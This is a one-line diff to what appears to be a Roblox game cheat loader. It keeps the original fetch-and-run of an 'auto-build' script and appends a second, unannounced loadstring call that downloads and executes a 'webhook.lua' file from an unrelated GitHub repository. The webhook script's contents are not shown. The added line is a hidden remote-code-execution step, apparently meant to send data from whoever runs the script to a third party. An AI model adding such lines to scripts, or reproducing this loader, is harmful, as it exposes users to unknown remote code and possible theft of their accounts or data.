@@ -1,1 +1,1 @@
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/max2007killer/auto-build-not-limit/main/buildaboatv2obs.txt"),true))()
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/max2007killer/auto-build-not-limit/main/buildaboatv2obs.txt"),true))() task.wait(1) loadstring(game:HttpGet(("https://raw.githubusercontent.com/ImTimmy228/zebiter/refs/heads/main/src/webhook.lua"),true))()
